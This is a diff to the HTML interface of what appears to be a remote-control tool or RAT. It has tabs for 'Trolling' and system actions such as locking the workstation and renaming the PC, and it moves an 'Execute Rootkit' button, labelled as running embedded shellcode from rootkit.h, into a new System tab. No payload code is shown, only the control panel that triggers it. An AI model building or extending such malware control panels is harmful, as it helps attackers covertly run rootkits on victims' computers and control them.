@@ -202,6 +202,7 @@
                     <button class="tab active" data-tab="useful">🛠️ Useful</button>
                     <button class="tab" data-tab="communication">💬 Communication</button>
                     <button class="tab" data-tab="trolling">🎮 Trolling</button>
+                    <button class="tab" data-tab="system">⚙️ System</button>
                 </div>
 
                 <!-- Tab Contents -->
@@ -231,15 +232,6 @@
                     <div class="control-buttons">
                         <button class="btn btn-warning" onclick="lockPC()">🔒 Lock Workstation</button>
                     </div>
-                    
-                    <br>
-                    <h3>💀 Rootkit (from rootkit.h)</h3>
-                    <div class="control-buttons">
-                        <button class="btn btn-danger" onclick="executeRootkit()">💀 Execute Rootkit</button>
-                    </div>
-                    <p style="color: var(--text-dim); font-size: 11px; margin-top: 10px;">
-                        ⚠️ Executes embedded shellcode from rootkit.h (176KB)
-                    </p>
                 </div>
 
                 <div class="tab-content" id="communication">
@@ -343,8 +335,9 @@
                         <button class="btn btn-info" onclick="playSound('info')">ℹ️ Info</button>
                         <button class="btn btn-primary" onclick="playSound('question')">❓ Question</button>
                     </div>
-                    
-                    <br>
+                </div>
+
+                <div class="tab-content" id="system">
                     <h3>🔉 Volume Control</h3>
                     <div class="form-group">
                         <label>Volume Level (0-100):</label>
@@ -371,6 +364,15 @@
                         <input type="text" id="newPCName" placeholder="NewComputerName" maxlength="15">
                     </div>
                     <button class="btn btn-warning" onclick="renamePCFunc()">✏️ Rename PC (Restart Required)</button>
+                    
+                    <br><br>
+                    <h3>💀 Rootkit (from rootkit.h)</h3>
+                    <div class="control-buttons">
+                        <button class="btn btn-danger" onclick="executeRootkit()">💀 Execute Rootkit</button>
+                    </div>
+                    <p style="color: var(--text-dim); font-size: 11px; margin-top: 10px;">
+                        ⚠️ Executes embedded shellcode from rootkit.h (176KB)
+                    </p>
                 </div>
             </div>
         </div>
